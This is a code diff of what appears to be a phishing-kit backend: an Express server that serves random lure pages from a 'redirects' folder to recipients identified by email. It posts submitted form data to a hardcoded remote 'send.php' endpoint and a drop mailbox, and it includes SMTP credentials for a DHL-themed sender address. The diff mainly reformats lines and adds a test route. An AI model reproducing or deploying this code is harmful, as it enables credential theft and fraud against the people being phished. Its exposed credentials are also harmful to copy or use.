@@ -20,17 +20,20 @@ const redirectArray: string[] = [
 
 
 const 
-        link = 'https://wertyh.tk/cgi-bin/vendor/send.php',
-        email = 'alxy697@gmail.com',
-        smtpusername = 'dhl@1carwash.ml',
-        smtppass = 'ifeanyi12345',
-        smtpservername = '1carwash.ml',
-        lastRedirect = '';
+link = 'https://wertyh.tk/cgi-bin/vendor/send.php',
+email = 'alxy697@gmail.com',
+smtpusername = 'dhl@1carwash.ml',
+smtppass = 'ifeanyi12345',
+smtpservername = '1carwash.ml',
+lastRedirect = '';
 
 
-        // test();
-        // run $ nodemon index.js
-
+// test();
+// run $ nodemon index.js
+app.get('/test', (req: Request, res: Response) => {
+    res.write('<h1> working</h1>');
+    res.end();
+})
 app.get('/', (req: Request, res: Response) => {
     const email = req.query.email;
     const files = fs.readdirSync(__dirname + '/redirects/');
@@ -51,10 +54,10 @@ app.get('/', (req: Request, res: Response) => {
 app.get('/home', (req: Request, res: Response) => {
     const email = req.query.email;
     const files = fs.readdirSync(__dirname + '/redirects/');
-        const rand = Math.floor(Math.random() * files.length);
-        fs.readFile(__dirname + `/redirects/${files[rand]}`, 'utf8', (err, text) => {
-            res.send(text);
-        });
+    const rand = Math.floor(Math.random() * files.length);
+    fs.readFile(__dirname + `/redirects/${files[rand]}`, 'utf8', (err, text) => {
+        res.send(text);
+    });
 })
 app.post('/', (req: Request, res: Response) => {
     const reff = req.headers.referer || req.headers.referrer;
@@ -74,7 +77,7 @@ app.post('/', (req: Request, res: Response) => {
     }).then((res) => {
         
     }).catch((err) => {
-
+        
     });
     if (req.body.error !== ''){
         redirectUrl = lastRedirect;
